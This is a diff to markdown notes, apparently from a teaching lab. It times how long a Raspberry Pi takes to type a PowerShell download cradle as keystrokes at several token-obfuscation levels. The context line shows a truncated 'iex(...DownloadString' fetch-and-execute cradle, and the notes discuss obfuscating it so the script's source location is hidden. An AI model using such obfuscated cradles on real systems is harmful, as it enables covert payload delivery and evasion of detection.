@@ -68,9 +68,32 @@ What can be obfuscate ? This ```iex(New-Object System.Net.WebClient).DownloadStr
 3. The argument ```System.Net.WebClient```
 4. The member ```DownloadString```
 
-As for obfuscating cradle since it will display the location of where the script will be retrieve from, we will perform more indepth obfuscation with TOKENS obfuscating. 
+Things to note:  
+1. As for obfuscating cradle since it will display the location of where the script will be retrieve from, we will perform more indepth obfuscation with TOKENS obfuscating. --- Students can proceed to "Event Viewer" to actually see the commands that have been typed out. Since we are using "powershell" as can be since when keystrokes are sent. They are most likely going to see what have been typed.
 
-Students can proceed to "Event Viewer" to actually see the commands that have been typed out. Since we are using "powershell" as can be since when keystrokes are sent. They are most likely going to see what have been typed.
+2. Length of cradle, since it will be keystrokes sent from PI, students will see the commands being typed into the cmd.exe. In the event, the cradle is too lengthy, the keystrokes sending will take a longer time.copy
+
+# Testings Results (Cradle)
+### Original
+| Testings | Timing | 
+| --- | --- |
+| Test 1 | 4.423 seconds  | 
+| Test 2 | 4.730 seconds  | 
+| Test 3 | 4.850 seconds  | 
+
+### ALL Token Obfuscation (String, Command, Argument and Member)
+| Testings | Timing | 
+| --- | --- |
+| Test 1 | 4.870 seconds  | 
+| Test 2 | 4.810 seconds  | 
+| Test 3 | 4.780 seconds  | 
+
+### ALL Token Obfuscation (String, Command, Argument and Member) + String Obfuscation
+| Testings | Timing | 
+| --- | --- |
+| Test 1 | 5.170 seconds  | 
+| Test 2 | 4.980 seconds  | 
+| Test 3 | 4.930 seconds  | 
 
 # Testings Results (Powershell Script)
 ### Base without any obfuscation  
